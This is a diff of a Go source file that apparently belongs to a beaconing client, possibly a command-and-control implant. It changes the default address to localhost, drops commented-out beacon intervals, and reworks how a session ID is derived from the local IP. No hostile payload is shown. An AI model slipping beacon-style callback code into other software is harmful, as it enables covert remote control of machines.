@@ -45,14 +45,12 @@ var (
 	sessionId       string
 	logStream       *log.Logger
 	logEnabled      bool      = true
-	address         string    = "127.0.0.1"
+	address         string    = "localhost"
 	port            string    = "54678"
 	startTime       time.Time = time.Now().UTC()
 	exitProcess     bool      = false
 	sentFirstBeacon bool      = false
-	//maxRetries        int       = 5
-	//beaconMinInterval uint32    = 5 * 60 * 1000
-	//beaconMaxInterval uint32    = 45 * 60 * 1000
+
 	retryIntervals = []int{
 		10000,
 		30000,
@@ -160,30 +158,27 @@ func WriteLog(message string, v ...any) {
 }
 
 func GetSessionID(conn net.Conn) error {
-	fullAddress := conn.LocalAddr().String()
-
-	// Split IP address and port
-	addrParts := strings.Split(fullAddress, ":")
-	if len(addrParts) < 2 {
-		return fmt.Errorf("invalid IP address format: %s", fullAddress)
-	}
-	ipAddress := addrParts[0]
+	netAddress := conn.LocalAddr()
+	ipAddress := netAddress.String()
 
 	// Handle special case for loopback address
-	if ipAddress == "::1" {
+	if strings.Contains(ipAddress, "::1") {
 		ipAddress = "127.0.0.1"
+	} else {
+		ipAddress = strings.Split(ipAddress, ":")[0]
 	}
 	WriteLog("IP Address: %s", ipAddress)
-
-	// Compute sum of IP address parts
-	parts := strings.Split(ipAddress, ".")
 	sumIp := 0
-	for _, part := range parts {
-		partInt, err := strconv.Atoi(part)
-		if err != nil {
-			return fmt.Errorf("failed to convert IP address part to integer: %w", err)
+	if strings.Contains(ipAddress, ".") {
+		// Compute sum of IP address parts
+		parts := strings.Split(ipAddress, ".")
+		for _, part := range parts {
+			partInt, err := strconv.Atoi(part)
+			if err != nil {
+				return fmt.Errorf("failed to convert IP address part to integer: %w", err)
+			}
+			sumIp += partInt
 		}
-		sumIp += partInt
 	}
 
 	// Prepare data for hashing
